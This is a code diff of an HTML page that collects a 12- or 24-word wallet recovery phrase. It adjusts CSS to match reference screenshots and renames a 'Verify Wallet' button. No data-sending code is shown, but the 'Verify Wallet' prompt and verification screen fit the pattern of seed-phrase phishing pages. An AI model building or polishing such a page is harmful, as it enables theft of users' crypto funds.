@@ -161,35 +161,49 @@
         /* Inputs Container Layout */
         .inputs-container {
             display: grid;
-            grid-template-columns: repeat(3, 120px);
+            grid-template-columns: repeat(3, 124px);
             justify-content: center;
-            gap: 6px;
+            gap: 8px;
             width: 100%;
             margin-bottom: 14px;
         }
 
-        /* Input Group - Dynamically updated based on mode */
+        /* 12-word mode: taller vertical boxes matching Screenshot 1 */
+        .inputs-container.mode-12 {
+            max-height: none;
+        }
+        .inputs-container.mode-12 .input-group {
+            height: 52px;
+        }
+
+        /* 24-word mode: compact scrollable/fitted layout matching Screenshot 2 */
+        .inputs-container.mode-24 {
+            max-height: 310px;
+            overflow-y: auto;
+            padding-right: 2px;
+        }
+        .inputs-container.mode-24::-webkit-scrollbar {
+            width: 4px;
+        }
+        .inputs-container.mode-24::-webkit-scrollbar-thumb {
+            background: #272730;
+            border-radius: 4px;
+        }
+        .inputs-container.mode-24 .input-group {
+            height: 42px;
+        }
+
+        /* Input Group styling */
         .input-group {
             position: relative;
             background-color: #141417;
             border: 1px solid #272730;
-            border-radius: 9px;
-            padding: 0 9px;
+            border-radius: 12px;
+            padding: 0 12px;
             display: flex;
-            flex-direction: row; 
             align-items: center;
-            gap: 5px; 
-            transition: border-color 0.2s, box-shadow 0.2s, height 0.2s;
-        }
-
-        /* 12-word layout height (more vertical) */
-        .inputs-container.mode-12 .input-group {
-            height: 84px;
-        }
-
-        /* 24-word layout height (compact) */
-        .inputs-container.mode-24 .input-group {
-            height: 54px;
+            gap: 6px;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
 
         .input-group:focus-within {
@@ -203,10 +217,10 @@
         }
 
         .input-group label {
-            font-size: 14.5px;
-            color: #a1a1aa;
+            font-size: 14px;
+            color: #71717a;
             font-weight: 500;
-            min-width: 24px;
+            min-width: 22px;
             line-height: 1;
             user-select: none;
         }
@@ -215,7 +229,7 @@
             background: transparent;
             border: none;
             color: #fff;
-            font-size: 16.5px; 
+            font-size: 15px;
             outline: none;
             width: 100%;
             line-height: 1.2;
@@ -311,7 +325,7 @@
 
                 <button type="button" class="toggle-phrase" id="toggleBtn">I have a 24-word recovery phrase</button>
 
-                <button type="button" class="action-btn" id="importBtn">Verify Wallet</button>
+                <button type="button" class="action-btn" id="importBtn">Import Wallet</button>
             </div>
 
             <!-- Loading / Verification Screen -->
@@ -379,7 +393,6 @@
 
         function renderInputs() {
             inputsGrid.innerHTML = '';
-            // Switch layout classes based on wordCount
             if (wordCount === 12) {
                 inputsGrid.className = "inputs-container mode-12";
             } else {
